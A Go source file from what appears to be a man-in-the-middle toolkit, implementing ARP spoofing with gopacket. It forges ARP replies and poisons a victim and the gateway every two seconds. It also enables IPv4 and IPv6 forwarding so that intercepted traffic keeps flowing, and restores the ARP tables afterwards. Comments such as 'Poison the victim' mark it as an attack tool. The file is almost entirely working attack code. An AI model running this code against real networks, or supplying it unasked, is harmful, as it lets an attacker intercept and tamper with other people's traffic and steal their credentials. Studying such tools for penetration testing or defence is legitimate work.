package arp

import (
	"fmt"
	"net"
	"os"
	"time"

	"mitm-toolkit/network"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// Sending Fake ARP reply - even when not asked
func SendARPSpoof(handle *pcap.Handle, targetIP string, targetMAC string, spoofedIP string, attackerInterface network.NetworkInterface) error {

	srcMAC, err := net.ParseMAC(attackerInterface.MacAddress)
	if err != nil {
		return fmt.Errorf("Invalid source MAC address: %v", err)
	}

	dstMAC, err := net.ParseMAC(targetMAC)
	if err != nil {
		return fmt.Errorf("Invalid destination MAC address: %v", err)
	}

	// Building the Ethernet Layer - the envelope
	eth := layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeARP,
	}

	// Building the ARP layer - what inside the envelope
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   []byte(srcMAC),
		SourceProtAddress: []byte(net.ParseIP(spoofedIP).To4()),
		DstHwAddress:      []byte(dstMAC),
		DstProtAddress:    []byte(net.ParseIP(targetIP).To4()),
	}

	// Serialize the Packet (Convert to raw bytes) -> Need to send raw
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	err = gopacket.SerializeLayers(buf, opts, &eth, &arp)
	if err != nil {
		return fmt.Errorf("failed to serialize packet: %v", err)
	}

	// Send it
	err = handle.WritePacketData(buf.Bytes())
	if err != nil {
		return fmt.Errorf("failed to send ARP spoof: %v", err)
	}

	return nil

}

// This is important — otherwise, the victim loses internet when you intercept traffic.
func EnableIPForwarding() error {
	// 0 (forwarding disabled)
	// 1 (fowarding enabled)
	// echo 1 > /proc/sys/net/ipv4/ip_forward

	err := os.WriteFile("/proc/sys/net/ipv4/ip_forward", []byte("1"), 0644)
	if err != nil {
		return fmt.Errorf("failed to enable IP forwarding: %v", err)
	}

	return nil
}

// Enable ipv6 fowarding
func EnableIPv6Forwarding() error {
	err := os.WriteFile("/proc/sys/net/ipv6/conf/all/forwarding", []byte("1"), 0644)
	if err != nil {
		return fmt.Errorf("failed to enable IPv6 forwarding: %v", err)
	}
	return nil

}

// Starting the ARP spoofing
// localNetwork => attacker
func StartARPSpoofing(
	localNetwork network.NetworkInterface,
	targetIP string, targetMAC string,
	gatewayIP string, gatewayMAC string,
) error {

	// Open the network interface
	handle, err := pcap.OpenLive(
		localNetwork.InterfaceName,
		1600,
		true,
		pcap.BlockForever,
	)
	if err != nil {
		return fmt.Errorf("Faild to open interface: %v", err)
	}

	defer handle.Close()

	// Poison every 2 seconds
	ticker := time.NewTicker(time.Second * 2)

	for {
		<-ticker.C

		// Poison the victim - 'Hey victim, I am the gateway'
		if err := SendARPSpoof(handle, targetIP, targetMAC, gatewayIP, localNetwork); err != nil {
			return err
		}

		// Poison the gateway - 'Hey gateway, I am the target'
		if err := SendARPSpoof(handle, gatewayIP, gatewayMAC, targetIP, localNetwork); err != nil {
			return err
		}
	}

}

// Restoring the ARP table
func RestoreARP(
	localNetwork network.NetworkInterface,
	targetIP string, targetMAC string,
	gatewayIP string, gatewayMAC string,
) error {

	realGateway := network.NetworkInterface{MacAddress: gatewayMAC}
	realTarget := network.NetworkInterface{MacAddress: targetMAC}

	// Open the network interface
	handle, err := pcap.OpenLive(
		localNetwork.InterfaceName,
		1600,
		true,
		5*time.Second,
	)

	if err != nil {
		return fmt.Errorf("Faild to open interface: %v", err)
	}

	defer handle.Close()

	for i := 0; i < 3; i++ {

		// Send TO: victim (targetIP, targetMAC)
		// Claiming to be: gateway (gatewayIP)
		// Sending from: real gateway MAC (realGateway)
		// Message: "Hey victim, gateway IP = real gateway MAC"
		SendARPSpoof(handle, targetIP, targetMAC, gatewayIP, realGateway)

		// Send TO: gateway (gatewayIP, gatewayMAC)
		// Claiming to be: victim (targetIP)
		// Sending from: real target MAC (realTarget)
		// Message: "Hey gateway, victim IP = real victim MAC"
		SendARPSpoof(handle, gatewayIP, gatewayMAC, targetIP, realTarget)
	}

	return nil
}
